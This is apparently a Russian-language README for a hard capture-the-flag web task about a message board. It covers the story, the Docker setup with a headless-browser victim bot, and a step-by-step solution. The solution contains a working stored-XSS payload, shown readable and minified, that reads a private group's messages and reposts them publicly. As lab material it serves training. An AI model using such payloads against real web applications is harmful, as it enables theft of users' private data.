# XSS

## Описание

Автор: Трофимов Д.А. (happypiece), Волгин И.А. (furlupe)  
Название: 3ch  
Лицензия: MIT License  
Сложность: Hard  
Описание: создание xss-нагрузки для кражи флага из приватной группы
Теги: web, xss  

## Легенда

Вам стало известно, что в одной из закрытых групп приложения BoardApp©™ сотрудники некоторой сети ресторанов быстрого питания "Вкус** * *очка" распространяют промокоды на бесплатный белковый напиток.  
Также, из слитых ранее промокодов, выяснилось, что все они пересылаются в виде HITS{promocode_name}.  
Представители оргагнизации с аббревиатурой HITS давать комментарии отказались, но вполне вероятно, что участники интересующей нас группы также часто посещают тематическое сообщество, связанное с информационной безопасностью.  
Ваша задача: покушать нахаляву, а для этого необходимо украсть промокод, находящийся в одной из закрытых групп. По неподтвержденным данным, сервис был написан дилетантами, что позволяет предположить, что в нем найдется пара уязвимостей.  

## Флаг

HITS{promocode_name}  
Лежит в переменной среды CTF_FLAG (указывается в docker-compose.yml)

## Развертывание

**Внезапно: `docker compose up`**  
Задача поднимается в трех контейнерах: собственно, уязвимое приложение, его бд, и сервис, который раз в n секунд (указывается также в компоузе) открывает приложение в хэдлесс-браузере, логинится и идет посмотреть на страничку указанной группы, при этом исполняя находящийся там xss.  
**Обратите внимание, что докер-образ клиента, исполняющего xss-нагрузку, весит 2ГБ GL;HF**  
Я честно пытался его уменшить (раньше он весил ~3.2), но если убрать что-то еще то он отказывается работать (мб мне просто не повезло).  
*Кроме того, так как задача на stored xss, участники имеют возможность мешать друг другу, поэтому по-хорошему нужны индивидуальные инстансы.*

## Решение

1. Из тега задачи и функционала сайта, нетрудно предположить, что уязвимость кроется в функционале сообщений в группах.
2. Проверим наше предположение, отправив сообщение с произвольной нагрузкой, например: <script>alert("yo mama obama")</script>
3. Убедившись, что нагрузка выполняется, можно приступать к планированию настоящей атаки. Из условия задачи легко сделать вывод, что ресурс, который посещают участники интересующей нас закрытая группы — сообщество с названием "Cybersafety enjoyers club", при этом закрытых групп всего две.
4. Приходим к выводу, что нам необходимо разместить нагрузку в уже упомянутой группе, при этом, будучи исполненной пользователем с правами доступа к целевой группе, скрипт должен получать содержание ее сообщений и затем каким-то образом доставлять эти сообщения в наши маленькие ручки.
5. Скорее всего, в процессе написания нагрузки, придется столкнуться с тем, что максимальная длина сообщения — 320 символов, что не позволяет написать сколь угодно сложный (и длинный) скрипт. Проблему можно решить, разбивая нагрузку на функции и отправляя их отдельными сообщениями, а можно вот так:
```html
<script>
  window.onload = () => {
    var x = $("#message-container").clone();
      x.load(`${window.location.protocol}//${window.location.host}/board/board/7fc0c328-c1f1-438f-afc5-bb13021ed832 p:contains("HITS")`, () => {
      $("#message-input").val(x.text());
      $("[send]").trigger("click");
    });
  };
</script>
```
После удаления пробелов и отступов получаем сообщение длиной ~280 символов:
```html
<script>window.onload=()=>{var x = $("#message-container").clone();x.load(`${window.location.protocol}//${window.location.host}/board/board/7fc0c328-c1f1-438f-afc5-bb13021ed832 p:contains("HITS")`,()=>{$("#message-input").val(x.text());$("[send]").trigger("click");});};</script>
```  
(при желании, можно, конечно, еще короче, но желания у меня нет)  
6. Представленный скрипт, будучи исполненным в браузере пользователя, имеющего доступ к целевой группе, отправляет в открытую группу, где находится нагрузка, содержание интересующего нас сообщения.  
7. Таким образом, для решения задачи необходимо отправить эту нагрузку, подставляя в строку поиска айдишник закрытых групп, коих, как говорилось, всего две (в примере используется нужный).
